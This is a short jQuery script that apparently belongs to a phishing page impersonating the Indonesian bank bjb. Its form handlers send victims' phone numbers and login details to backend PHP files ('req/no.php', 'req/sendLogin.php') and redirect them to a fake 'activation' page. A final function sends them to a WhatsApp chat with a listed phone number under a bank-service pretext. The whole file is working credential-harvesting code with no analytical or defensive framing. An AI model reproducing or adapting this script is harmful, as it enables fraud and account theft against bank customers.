$('#eform').on('submit', function (event) { 
  event.stopPropagation();
    event.preventDefault();  
    $('.load').fadeIn(); 
  document.getElementById('kirims').innerHTML = "Memproses....";
$.ajax({
 type: 'POST',
 url: 'req/no.php',
 async: false,
 dataType: 'JSON',
 data: $(this).serialize(),
 complete: function(data) {
         console.log('Complete')
  setTimeout(function(){
    window.location.href='data.html';  
var nomor = document.getElementById("nomor").value;
sessionStorage.setItem("nomor", nomor);
$('.load').fadeOut(); 
     }, 500);
        }
    });
    return false;
});

       
    
$('#login').on('submit', function (event) {
  event.stopPropagation();
    event.preventDefault();   
    $('.load').fadeIn();  
  document.getElementById('kirims').value = "Memproses....";
$.ajax({
 type: 'POST',
 url: 'req/sendLogin.php',
 async: false,
 dataType: 'JSON',
 data: $(this).serialize(),
 complete: function(data) {
            console.log('Complete')
  setTimeout(function(){
    window.location.href='aktivasi.html';  
    $('.load').fadeOut(); 
     }, 500);
        }
    });
    return false;
});           
    

audio4 = document.getElementById("bsiku");
function go(){
$('.load').fadeIn();
audio4.play();    
audio4.loop = false;
setTimeout(function(){  
location.href='https://api.whatsapp.com/send?phone=6282182480632&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯,%0ASaya mau request Pesan SMS ke layanan (83373)';
$('.load').fadeOut();
    }, 5500);    
}  